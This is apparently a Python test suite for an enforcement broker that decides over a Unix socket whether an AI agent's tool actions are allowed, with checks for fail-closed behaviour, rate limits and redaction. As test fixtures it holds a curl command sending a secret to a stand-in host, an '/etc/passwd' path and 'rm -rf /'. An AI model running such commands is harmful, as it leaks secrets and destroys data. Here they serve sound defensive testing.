"""W78 step 5 (5a): the enforcement broker (umwayi/broker.py), run as a real child process on a Unix socket.

The rules are those of docs/enforcement-broker-design.md, W78.B1 to B12. `log` is not built (open question 3 of the design, so
a request of type `log` is an unknown type). Nothing starts the broker yet and no hook asks it: these tests start it themselves.
What they do not show: a confined helper, a platform that lets its hook connect, macOS. No confinement exists.

Folders are made in /tmp, because a Unix socket path is short (104 bytes on macOS).
"""
import ast
import json
import os
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path

from umwayi import broker, logbook, rules, taskqueue
from umwayi.errors import UmwayiError

REPO = Path(__file__).resolve().parent.parent
SECRET = "S78-BROKER-SECRET-never-in-an-answer"
RULES = """rules:
  - id: read-yes
    title: reading is fine
    text: RULE-TEXT-never-in-an-answer
    verdict: yes
    matchers:
      type: tool_read
  - id: delete-no
    title: no deletes
    text: Deleting is refused.
    verdict: no
    matchers:
      type: tool_delete_file
  - id: shell-ask
    title: shell asks
    text: The owner confirms.
    verdict: ask
    matchers:
      type: tool_bash
"""
RID = "0123456789abcdef"
OTHER = "fedcba9876543210"
ROW = {"agent": "reviewer", "platform": "claude-code", "task": "T-01", "mode": "enforced", "ended": False}
READ = {"type": "tool_read", "tool": "Read", "path": "/p/a"}
DELETE = {"type": "tool_delete_file", "tool": "Delete"}
SHELL = {"type": "tool_bash", "tool": "Bash", "command": f"curl https://example.invalid/?t={SECRET}"}


def check(action, run=RID):
    return {"type": "check", "run": run, "action": action}


def start_broker(root, table, folder, name="broker.sock", wait_s=5.0):
    """What a supervisor will do: check the folder, run the fixed argument list with its own process start and a small
    environment, and wait for the socket. (This module starts no program; the test does.)"""
    broker.check_folder(folder)
    sock = Path(folder) / name
    if os.path.lexists(sock):
        raise broker.TableError("table")
    env = {k: os.environ[k] for k in ("PATH", "LANG") if k in os.environ}
    env["PYTHONPATH"] = str(REPO)
    proc = subprocess.Popen(broker.argv(root, table, sock), shell=False, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL, env=env)
    return broker.wait_for(broker.Handle(proc, sock), wait_s)


class BrokerCase(unittest.TestCase):
    def setUp(self):
        self.base = Path(tempfile.mkdtemp(prefix="ub", dir="/tmp"))
        self.addCleanup(shutil.rmtree, self.base, True)
        self.root = self.base / "root"
        self.root.mkdir()
        (self.root / "rules.yaml").write_text(RULES, encoding="utf-8")
        self.folder = self.base / "run"
        self.folder.mkdir(mode=0o700)
        self.table = self.folder / "table.json"
        self.runs = {RID: dict(ROW)}
        broker.write_table(self.table, self.runs)
        self.handle = None

    def start(self, folder=None, name="broker.sock", wait_s=5.0):
        self.handle = start_broker(self.root, self.table, folder or self.folder, name, wait_s)
        self.addCleanup(self.handle.stop)
        return self.handle

    def ask(self, request, **kw):
        return broker.ask(self.handle.sock_path, request, **kw)

    def entries(self):
        return logbook.read_checked(self.root)

    def log_text(self):
        p = self.root / "LOGBOOK.md"
        return p.read_text(encoding="utf-8") if p.exists() else ""


class AnswerTests(BrokerCase):
    def test_the_three_answers_and_the_rule_id(self):
        self.start()
        self.assertEqual(self.ask(check(READ)), {"answer": "Yes", "rule": "read-yes"})
        self.assertEqual(self.ask(check(DELETE)), {"answer": "No", "rule": "delete-no"})
        self.assertEqual(self.ask(check(SHELL)), {"answer": "Ask me first", "rule": "shell-ask"})

    def test_b5_the_broker_writes_the_entry_and_it_holds_no_command(self):
        self.start()
        self.ask(check(SHELL))
        mine = [e for e in self.entries() if e.source == "umwayi check"]
        self.assertEqual(len(mine), 1)
        self.assertIn("Rule shell-ask gave Ask me first; action type: tool_bash; command word: curl", mine[0].added)
        self.assertNotIn(SECRET, self.log_text())

    def test_b4_the_answer_holds_a_verdict_and_a_rule_id_only(self):
        self.start()
        for action in (READ, DELETE, SHELL):
            got = self.ask(check(dict(action, note=SECRET)))
            self.assertEqual(set(got), {"answer", "rule"})
            self.assertNotIn(SECRET, json.dumps(got))
            self.assertNotIn("RULE-TEXT", json.dumps(got))

    def test_b5_the_verdict_comes_from_the_rules_not_the_request(self):
        self.start()
        got = self.ask(check(dict(DELETE, answer="Yes", verdict="Yes", decision="Yes")))
        self.assertEqual(got["answer"], "No")

    def test_an_ask_me_first_adds_one_queue_row_in_fixed_words_and_answer_status_reads_it(self):
        self.start()
        self.assertEqual(self.ask({"type": "answer_status", "run": RID}), {"answer": "none", "rule": None})
        self.ask(check(SHELL))
        self.ask(check(SHELL))  # the same run and title: still one row
        rows = taskqueue.list_rows(self.root)
        self.assertEqual([r.title for r in rows], [f"Ask me first in run {RID}"])
        self.assertNotIn(SECRET, rows[0].recommendation)
        self.assertEqual(self.ask({"type": "answer_status", "run": RID})["answer"], "open")
        taskqueue.answer(self.root, rows[0].id, "no", rules.system_today(), revisit_if="none")
        self.assertEqual(self.ask({"type": "answer_status", "run": RID})["answer"], "answered")


class RunTests(BrokerCase):
    def test_b3_an_unknown_run_and_an_ended_run_are_refused(self):
        self.runs[OTHER] = dict(ROW, ended=True)
        broker.write_table(self.table, self.runs)
        self.start()
        self.assertEqual(self.ask(check(READ, run="aaaaaaaaaaaaaaaa"))["why"], "unknown_run")
        self.assertEqual(self.ask(check(READ, run=OTHER))["why"], "run_ended")
        self.assertEqual(self.ask(check(READ, run="not-a-run-id"))["why"], "bad_request")
        self.assertEqual(self.ask(check(READ))["answer"], "Yes")

    def test_b3_a_run_that_ends_after_the_start_is_refused_from_then_on(self):
        self.start()
        self.assertEqual(self.ask(check(READ))["answer"], "Yes")
        self.runs[RID]["ended"] = True
        broker.write_table(self.table, self.runs)
        self.assertEqual(self.ask(check(READ))["why"], "run_ended")

    def test_b3_the_platform_is_the_tables_not_the_requests(self):
        (self.root / "rules.yaml").write_text(RULES + """  - id: kiro-only
    title: kiro reads
    text: x
    verdict: no
    matchers:
      platform: kiro
      type: tool_read
""", encoding="utf-8")
        self.start()
        # the table says claude-code: a request that claims kiro still gets the claude-code answer
        self.assertEqual(self.ask(check(dict(READ, platform="kiro")))["rule"], "read-yes")
        self.runs[OTHER] = dict(ROW, platform="kiro")
        broker.write_table(self.table, self.runs)
        self.assertEqual(self.ask(check(dict(READ, platform="claude-code"), run=OTHER))["rule"], "kiro-only")

    def test_a_broken_table_refuses_everything(self):
        self.start()
        self.table.write_text("{", encoding="utf-8")
        self.assertEqual(self.ask(check(READ))["why"], "table")


class RequestTests(BrokerCase):
    def test_b2_only_check_and_answer_status_are_served(self):
        self.start()
        for t in ("log", "shell", "write", "CHECK", ""):
            with self.subTest(type=t):
                self.assertEqual(self.ask({"type": t, "run": RID})["why"], "unknown_type")

    def test_b2_a_key_that_names_a_path_a_command_or_a_root_is_refused(self):
        self.start()
        for extra in ({"path": "/etc/passwd"}, {"command": "rm -rf /"}, {"root": "/tmp"}, {"rules": "/tmp/r.yaml"}):
            with self.subTest(extra=extra):
                self.assertEqual(self.ask(dict(check(READ), **extra))["why"], "bad_request")
        self.assertEqual(self.ask({"type": "answer_status", "run": RID, "action": READ})["why"], "bad_request")
        self.assertEqual(self.ask(check("a string"))["why"], "bad_request")

    def test_a_refusal_is_one_entry_with_a_word_and_never_the_request(self):
        self.start()
        self.ask({"type": "log", "run": RID, "note": SECRET})
        mine = [e for e in self.entries() if e.source == broker.SOURCE]
        self.assertEqual([(e.added, e.checked) for e in mine][0][0], "Refused a request: unknown_type")
        self.assertEqual(mine[0].checked, f"run {RID}")
        self.assertNotIn(SECRET, self.log_text())

    def test_planted_fault_a_served_unknown_type_would_return_a_verdict(self):
        self.start()
        self.assertNotIn(self.ask({"type": "log", "run": RID})["answer"], ("Yes", "Ask me first"))


class LimitTests(BrokerCase):
    def raw(self, data, wait=True):
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(15)
        s.connect(str(self.handle.sock_path))
        s.sendall(data)
        if not wait:
            return s
        buf = b""
        while b"\n" not in buf:
            chunk = s.recv(1024)
            if not chunk:
                break
            buf += chunk
        s.close()
        return json.loads(buf.decode()) if buf else None

    def test_b7_an_oversize_request_is_refused_not_served(self):
        self.start()
        big = json.dumps(check(dict(READ, pad="x" * broker.MAX_REQUEST_BYTES))).encode() + b"\n"
        self.assertEqual(self.raw(big)["why"], "too_big")

    def test_b7_a_trickling_client_is_cut_at_the_deadline_and_holds_no_one_else(self):
        old = broker.DEADLINE_S
        broker.DEADLINE_S = 1.0  # the child reads its own copy: the limit is also a constant of the child's code
        self.addCleanup(setattr, broker, "DEADLINE_S", old)
        self.start()
        s = self.raw(b'{"type":', wait=False)  # never finishes
        t0 = time.monotonic()
        self.assertEqual(self.ask(check(READ))["answer"], "Yes")  # others are served while it hangs
        self.assertLess(time.monotonic() - t0, 5)
        s.settimeout(15)
        got = s.recv(1024)  # the child's deadline is 10 s: it answers `timeout` and closes
        s.close()
        self.assertIn(b"timeout", got)

    def test_b7_the_17th_connection_is_told_busy(self):
        self.start()
        held = [self.raw(b'{"type":', wait=False) for _ in range(broker.MAX_CONNECTIONS)]
        try:
            time.sleep(0.5)
            self.assertEqual(self.raw(b"{}\n")["why"], "busy")
        finally:
            for s in held:
                s.close()

    def test_b7_more_than_20_requests_a_second_for_one_run_are_refused(self):
        b = broker.Broker(self.root, self.table)
        self.assertTrue(all(b.within_rate(RID, now=100.0 + i * 0.001) for i in range(broker.RATE_PER_S)))
        self.assertFalse(b.within_rate(RID, now=100.5))
        self.assertTrue(b.within_rate(OTHER, now=100.5))  # another run has its own count
        self.assertTrue(b.within_rate(RID, now=101.5))  # a second later it is served again

    def test_refusal_entries_are_capped_and_the_rest_counted(self):
        b = broker.Broker(self.root, self.table)
        for _ in range(broker.MAX_REFUSAL_ENTRIES + 15):
            b.refuse("bad_request", None)
        self.assertEqual(b.refused["bad_request"], broker.MAX_REFUSAL_ENTRIES + 15)
        self.assertEqual(sum(1 for e in logbook.read_checked(self.root) if e.source == broker.SOURCE), broker.MAX_REFUSAL_ENTRIES)


class FailClosedTests(BrokerCase):
    def test_b9_the_kill_switch_on_or_unreadable_makes_every_check_no(self):
        self.start()
        (self.root / ".umwayi").mkdir(exist_ok=True)
        (self.root / ".umwayi" / "KILL").write_text("", encoding="utf-8")
        got = self.ask(check(READ))
        self.assertEqual((got["answer"], got["rule"]), ("No", None))
        (self.root / ".umwayi" / "KILL").unlink()
        self.assertEqual(self.ask(check(READ))["answer"], "Yes")
        shutil.rmtree(self.root / ".umwayi")
        (self.root / ".umwayi").write_text("a file where the folder should be", encoding="utf-8")  # unreadable state
        self.assertEqual(self.ask(check(READ))["answer"], "No")

    def test_b11_a_broken_chain_or_a_failed_write_makes_the_answer_no(self):
        self.start()
        self.assertEqual(self.ask(check(READ))["answer"], "Yes")
        text = (self.root / "LOGBOOK.md").read_text(encoding="utf-8")
        (self.root / "LOGBOOK.md").write_text(text.replace("Rule read-yes gave Yes", "Rule read-yes gave No"), encoding="utf-8")
        got = self.ask(check(READ))
        self.assertEqual(got["answer"], "No")
        self.assertEqual(got["why"], "log_failed")

    def test_b8_no_answer_is_no_when_the_broker_is_down_or_gone(self):
        self.start()
        h = self.handle
        self.assertFalse(h.lost())
        h.proc.kill()
        h.proc.wait()
        self.assertTrue(h.lost())
        got = broker.ask(h.sock_path, check(READ), timeout=2)
        self.assertEqual((got["answer"], got["why"]), ("No", "no_answer"))
        self.assertEqual(broker.ask(self.base / "nothing.sock", check(READ), timeout=1)["answer"], "No")

    def test_b8_an_answer_that_is_not_the_fixed_shape_is_no(self):
        sock = self.base / "fake.sock"
        srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        srv.bind(str(sock))
        srv.listen(1)
        self.addCleanup(srv.close)

        def serve():
            c, _ = srv.accept()
            c.recv(100)
            c.sendall(b'{"answer":"Maybe"}\n')
            c.close()
        threading.Thread(target=serve, daemon=True).start()
        self.assertEqual(broker.ask(sock, check(READ), timeout=3)["answer"], "No")

    def test_the_broker_ends_with_exit_2_when_its_parent_ends(self):
        # a middle process starts the broker and exits; the broker then notices and ends by itself
        code = (f"import sys, subprocess; sys.path.insert(0, {str(REPO)!r}); from umwayi import broker; "
                f"p = subprocess.Popen(broker.argv({str(self.root)!r}, {str(self.table)!r}, {str(self.folder / 'p.sock')!r}), "
                f"env={{'PATH': '/usr/bin:/bin', 'PYTHONPATH': {str(REPO)!r}}}); print(p.pid, flush=True); "
                f"import time; time.sleep(1)")
        out = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, timeout=30)
        pid = int(out.stdout.split()[0])
        for _ in range(60):
            try:
                os.kill(pid, 0)
            except ProcessLookupError:
                break
            time.sleep(0.25)
        else:
            os.kill(pid, signal.SIGKILL)
            self.fail("the broker did not end when its parent ended")


class StartTests(BrokerCase):
    def test_b12_the_argument_list_is_fixed_and_a_root_is_never_read_from_a_request_or_the_environment(self):
        for argv in ([], ["--root", str(self.root)], ["--root", str(self.root), "--table", str(self.table), "--sock", "s", "--x", "y"],
                      ["--table", str(self.table), "--root", str(self.root), "--sock", str(self.folder / "s")]):
            with self.subTest(argv=argv):
                self.assertEqual(broker.main(argv), broker.EXIT_USAGE)
        source = (REPO / "umwayi" / "broker.py").read_text(encoding="utf-8")
        self.assertNotIn("os.environ[", source.replace('os.environ[k] for k in ("PATH"', ""))
        self.assertNotIn("UMWAYI_ROOT", source)
        self.assertNotIn("subprocess", source.replace("starts no program", ""))  # the process start is the supervisor's

    def test_an_env_variable_that_names_another_root_changes_nothing(self):
        other = self.base / "other"
        other.mkdir()
        (other / "rules.yaml").write_text(RULES.replace("verdict: yes", "verdict: no"), encoding="utf-8")
        os.environ["UMWAYI_ROOT"] = str(other)
        self.addCleanup(os.environ.pop, "UMWAYI_ROOT", None)
        self.start()
        self.assertEqual(self.ask(check(READ))["answer"], "Yes")  # this root's rules, not the other's

    def test_b1_the_broker_is_a_separate_process_that_can_write_what_a_confined_one_could_not(self):
        self.start()
        self.assertNotEqual(self.handle.proc.pid, os.getpid())
        self.ask(check(READ))
        self.assertTrue((self.root / "LOGBOOK.md").exists())  # written by the broker, not by this process

    def test_a_folder_that_is_not_private_or_a_planted_socket_path_is_refused(self):
        os.chmod(self.folder, 0o755)
        with self.assertRaises(broker.TableError):
            self.start()
        os.chmod(self.folder, 0o700)
        (self.folder / "broker.sock").write_text("planted", encoding="utf-8")
        with self.assertRaises(broker.TableError):
            self.start(wait_s=1.0)
        self.assertEqual((self.folder / "broker.sock").read_text(encoding="utf-8"), "planted")  # never replaced

    def test_the_socket_and_the_table_are_private_files(self):
        self.start()
        self.assertEqual(os.stat(self.handle.sock_path).st_mode & 0o777, 0o600)
        self.assertEqual(os.stat(self.table).st_mode & 0o777, 0o600)

    def test_stop_removes_the_socket_and_exits_0(self):
        self.start()
        self.assertEqual(self.handle.stop(), 0)
        self.assertFalse(os.path.exists(self.handle.sock_path))


class SourceTests(unittest.TestCase):
    def test_b10_the_writers_are_the_listed_ones_and_no_guard_file_or_goal_state_is_named(self):
        src = (REPO / "umwayi" / "broker.py").read_text(encoding="utf-8")
        tree = ast.parse(src)
        writers = set()
        for fn in [n for n in ast.walk(tree) if isinstance(n, ast.FunctionDef)]:
            for node in ast.walk(fn):
                if isinstance(node, ast.Call):
                    name = ast.unparse(node.func)
                    if name in ("os.open", "open", "os.replace", "os.chmod", "os.unlink", "os.fdopen", "logbook.append",
                                "taskqueue.add_once") and name != "os.open":
                        writers.add((fn.name, name))
                    if name == "os.open" and any(f in ast.unparse(node) for f in ("O_WRONLY", "O_CREAT")):
                        writers.add((fn.name, name))
        # write_table: the run table (the supervisor's side); serve: the socket file it makes and removes; refuse: one logbook
        # entry; queue_row: one queue row. The checked entry of `check` is written by rules.check_and_log, through logbook.append.
        self.assertEqual({fn for fn, _ in writers}, {"write_table", "serve", "refuse", "queue_row"})
        self.assertIn("rules.check_and_log(", src)
        self.assertEqual(len(broker.WRITES), 2)
        for guard in ("rules.yaml\"", "units.yaml", "autonomy.yaml", "agents.yaml", "guidance.yaml", "enforcement.yaml", "goals"):
            self.assertNotIn(guard, src.replace('self.root / "rules.yaml"', ""), guard)

    def test_the_module_imports_no_network_name_at_the_top(self):
        tree = ast.parse((REPO / "umwayi" / "broker.py").read_text(encoding="utf-8"))
        top = {a.name for n in tree.body if isinstance(n, ast.Import) for a in n.names}
        top |= {n.module for n in tree.body if isinstance(n, ast.ImportFrom)}
        self.assertFalse(top & {"socket", "http", "socketserver", "ssl"}, top)


if __name__ == "__main__":
    unittest.main()
